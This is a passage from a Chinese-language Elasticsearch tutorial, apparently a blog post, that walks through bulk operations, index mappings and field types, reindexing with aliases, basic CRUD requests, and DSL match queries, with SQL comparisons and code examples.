class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果原文档不存在，则是创建</li>
<li>如果原文档存在，则是替换(全量修改原文档)</li>
<li>区别在于actionName</li>
</ul>
<p>批量删除：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;delete&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;delete&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>依靠唯一id进行删除，也就不需要那个field对参数了</p>
<p>批量修改：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;update&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;doc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;ES大法必修内功&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;update&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;doc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554018421008</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里是依靠唯一id确定位置，然后对所需要修改的值进行处理就好了</p>
<h1 id="文档映射"><a href="#文档映射" class="headerlink" title="文档映射"></a>文档映射</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ES中映射可以分为动态映射和静态映射：</p>
<ul>
<li>动态映射</li>
</ul>
<p>在关系数据库中，需要事先创建数据库，然后在该数据库下创建数据表，并创建表字段、类型、长度、主键等，最后才能基于表插入数据。而Elasticsearch中不需要定义Mapping映射（即关系型数据库的表、字段等），在文档写入Elasticsearch时，会根据文档字段自动识别类型，这种机制称之为动态映射。动态映射规则如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/20/VYULGyNMSi91uEz.jpg"
                      alt="es6.jpg"
                ></p>
<ul>
<li>静态映射</li>
</ul>
<p>静态映射是在Elasticsearch中也可以事先定义好映射，包含文档的各字段类型、分词器等，这种方式称之为静态映射。</p>
<h2 id="核心类型"><a href="#核心类型" class="headerlink" title="核心类型"></a>核心类型</h2><ul>
<li><p>字符串：string类型包含 text 和 keyword</p>
<ul>
<li>text：该类型被用来索引长文本，在创建索引前会将这些文本进行分词，转化为词的组合，建立索引；允许ES来检索这些词，text类型不能用来排序和聚合。</li>
<li>keyword：该类型不能分词，可以被用来检索过滤、排序和聚合，keyword类型不可用text进行分词模糊检索。</li>
</ul>
</li>
<li><p>数值型：long、integer、short、byte、double、float</p>
</li>
<li><p>日期型：date</p>
</li>
<li><p>布尔型：boolean</p>
</li>
</ul>
<h2 id="映射操作"><a href="#映射操作" class="headerlink" title="映射操作"></a>映射操作</h2><p>创建映射：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PUT /es_db</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;book&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;analyzer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ik_smart&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;search_analyzer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ik_smart&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>获取文档映射：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /es_db/_mapping</span><br></pre></td></tr></table></figure>

<p>对已存在的mapping映射进行修改：</p>
<ol>
<li>如果要推倒现有的映射，你得重新建立一个静态索引</li>
<li>然后把之前索引里的数据导入到新的索引里</li>
<li>删除原创建的索引</li>
<li>为新索引起个别名, 为原索引名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 数据迁移</span><br><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  &quot;source&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;db_index&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dest&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;db_index_2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 删除原索引</span><br><span class="line">DELETE /db_index</span><br><span class="line"></span><br><span class="line">// 修改新索引的别名</span><br><span class="line">PUT /db_index_2/_alias/db_index</span><br></pre></td></tr></table></figure>

<p>通过这几个步骤就实现了索引的平滑过渡，并且是零停机。</p>
<h1 id="DSL查询"><a href="#DSL查询" class="headerlink" title="DSL查询"></a>DSL查询</h1><h2 id="基本增删改查"><a href="#基本增删改查" class="headerlink" title="基本增删改查"></a>基本增删改查</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建索引</span></span><br><span class="line"><span class="comment">//格式: PUT /索引名称</span></span><br><span class="line">PUT /es_demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询索引</span></span><br><span class="line"><span class="comment">//格式: GET /索引名称</span></span><br><span class="line">GET /es_demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除索引</span></span><br><span class="line"><span class="comment">//格式: DELETE /索引名称</span></span><br><span class="line">DELETE /es_demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加文档 </span></span><br><span class="line"><span class="comment">//格式: PUT /索引名称/类型/id</span></span><br><span class="line">PUT /es_demo/_doc/<span class="number">1</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">21</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;南京&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java developer&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除文档</span></span><br><span class="line"><span class="comment">//DELETE /索引名称/类型/id</span></span><br><span class="line">DELETE /es_demo/_doc/<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改文档 </span></span><br><span class="line"><span class="comment">//PUT /索引名称/类型/id</span></span><br><span class="line">PUT /es_demo/_doc/<span class="number">1</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;李多安&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">21</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;深圳&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;go developer&quot;</span>				</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询文档</span></span><br><span class="line"><span class="comment">//GET /索引名称/类型/id</span></span><br><span class="line">GET /es_demo/_doc/<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>注意:POST和PUT都能起到创建&#x2F;更新的作用</p>
<p>需要注意的是PUT需要对一个具体的资源进行操作也就是要确定id才能进行更新&#x2F;创建，</p>
<p>而POST是可以针对整个资源集合进行操作的，如果不写id就由ES生成一个唯一id进行创建新文档，如果填了id那就针对这个id的文档进行创建&#x2F;更新</p>
<p>PUT只会将json数据都进行替换, POST只会更新相同字段的值</p>
<p>PUT与DELETE都是幂等性操作, 即不论操作多少次, 结果都一样</p>
<p>​			</p>
<h2 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询当前类型中的所有文档 _search</span></span><br><span class="line"><span class="comment">//格式: GET /索引名称/类型/_search</span></span><br><span class="line"><span class="comment">//举例: GET /es_demo/_doc/_search</span></span><br><span class="line"><span class="comment">//SQL:  select * from student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//条件查询</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?q=*<span class="punctuation">:</span>***</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?q=age<span class="punctuation">:</span><span class="number">28</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where age = <span class="number">28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//范围查询</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?q=***<span class="punctuation">[</span><span class="number">25</span> TO <span class="number">26</span><span class="punctuation">]</span></span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?q=age<span class="punctuation">[</span><span class="number">25</span> TO <span class="number">26</span><span class="punctuation">]</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where age between <span class="number">25</span> and <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//根据多个ID进行批量查询</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_mget</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_mget </span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;ids&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;2&quot;</span><span class="punctuation">]</span>  </span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where id in (<span class="number">1</span><span class="punctuation">,</span><span class="number">2</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询年龄小于等于</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?q=age<span class="punctuation">:</span>&lt;=**</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?q=age<span class="punctuation">:</span>&lt;=<span class="number">28</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where age &lt;= <span class="number">28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询年龄大于</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?q=age<span class="punctuation">:</span>&gt;**</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?q=age<span class="punctuation">:</span>&gt;<span class="number">28</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where age &gt; <span class="number">28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?q=age<span class="punctuation">[</span><span class="number">25</span> TO <span class="number">26</span><span class="punctuation">]</span>&amp;from=<span class="number">0</span>&amp;size=<span class="number">1</span></span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?q=age<span class="punctuation">[</span><span class="number">25</span> TO <span class="number">26</span><span class="punctuation">]</span>&amp;from=<span class="number">0</span>&amp;size=<span class="number">1</span></span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student where age between <span class="number">25</span> and <span class="number">26</span> limit <span class="number">0</span><span class="punctuation">,</span> <span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//对查询结果只输出某些字段</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?_source=字段<span class="punctuation">,</span>字段</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?_source=name<span class="punctuation">,</span>age</span><br><span class="line">SQL<span class="punctuation">:</span>  select name<span class="punctuation">,</span>age from student</span><br><span class="line"></span><br><span class="line"><span class="comment">//对查询结构进行排序</span></span><br><span class="line">格式<span class="punctuation">:</span> GET /索引名称/类型/_search?sort=字段 desc</span><br><span class="line">举例<span class="punctuation">:</span> GET /es_demo/_doc/_search?sort=age<span class="punctuation">:</span>desc</span><br><span class="line">SQL<span class="punctuation">:</span>  select * from student order by age desc 【逆序</span><br></pre></td></tr></table></figure>

<h2 id="批量操作-1"><a href="#批量操作-1" class="headerlink" title="批量操作"></a>批量操作</h2><h3 id="批量获取文档数据"><a href="#批量获取文档数据" class="headerlink" title="批量获取文档数据"></a>批量获取文档数据</h3><h2 id="批量获取"><a href="#批量获取" class="headerlink" title="批量获取"></a>批量获取</h2><p>批量获取文档数据是使用_mget的API来实现的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_doc/_mget</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;docs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="批量操作-2"><a href="#批量操作-2" class="headerlink" title="批量操作"></a>批量操作</h2><ul>
<li><p>批量操作文档数据，批量对文档进行写操作是通过<code>_bulk</code>的API来实现的</p>
</li>
<li><p>请求方式：POST</p>
</li>
<li><p>请求地址：_bulk</p>
</li>
<li><p>请求参数：通过_bulk操作文档，一般至少有两行参数(或偶数行参数)</p>
</li>
<li><ul>
<li>第一行参数为指定操作的类型及操作的对象(index,type和id)</li>
<li>第二行参数才是操作的数据</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;actionName&quot;:&#123;&quot;_index&quot;:&quot;indexName&quot;, &quot;_type&quot;:&quot;typeName&quot;,&quot;_id&quot;:&quot;id&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;field1&quot;:&quot;value1&quot;, &quot;field2&quot;:&quot;value2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>批量新增文档</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;create&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;文章1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;内容1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;create&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;文章2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;内容2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span> <span class="string">&quot;面向对象&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554015482530</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>批量删除：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;delete&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;delete&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>依靠唯一id进行删除，也就不需要那个field对参数了</p>
<p>批量修改：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;update&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;doc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;ES大法必修内功&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;update&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_index&quot;</span><span class="punctuation">:</span><span class="string">&quot;article&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;doc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;create_time&quot;</span><span class="punctuation">:</span><span class="number">1554018421008</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里是依靠唯一id确定位置，然后对所需要修改的值进行处理就好了</p>
<p>批量操作的增删改都是依靠<code>actionName</code>来决定任务的。</p>
<h2 id="DSL查询-1"><a href="#DSL查询-1" class="headerlink" title="DSL查询"></a>DSL查询</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/20/GdtvIo4HMjXpTul.png"
                      alt="es7.jpg"
                ></p>
<h3 id="无条件查询"><a href="#无条件查询" class="headerlink" title="无条件查询"></a>无条件查询</h3><p>无查询条件是查询所有，默认是查询所有的，或者使用match_all表示所有：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;match_all&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="有条件查询"><a href="#有条件查询" class="headerlink" title="有条件查询"></a>有条件查询</h3><p>有条件查询分为叶子查询、组合查询和连接查询。</p>
<h4 id="叶子查询"><a href="#叶子查询" class="headerlink" title="叶子查询"></a>叶子查询</h4><h5 id="模糊匹配"><a href="#模糊匹配" class="headerlink" title="模糊匹配"></a>模糊匹配</h5><p>模糊匹配主要是针对文本类型的字段，文本类型的字段会对内容进行分词。</p>
<p>查询时也会对搜索条件进行分词，然后通过倒排索引查找到匹配的数据，模糊匹配主要通过match等参数来实现。</p>
<p>模糊匹配主要有三种查询<code>match</code>，<code>prefix</code>，<code>regexp</code>三种类型。</p>
<ul>
<li>match</li>
</ul>
<p>通过match关键词模糊匹配条件内容（通过match查询一个keyword字段时，如果查询内容和该字段内容一模一样，也是可以查出来的）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;南京&quot;</span>   <span class="comment">// 如果address是keyword类型的，使用match查询必须完全一致才能查到</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// multi_match多字段模糊匹配查询</span></span><br><span class="line"><span class="comment">//两个字段中存在一个就可以</span></span><br><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;multi_match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;name&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span 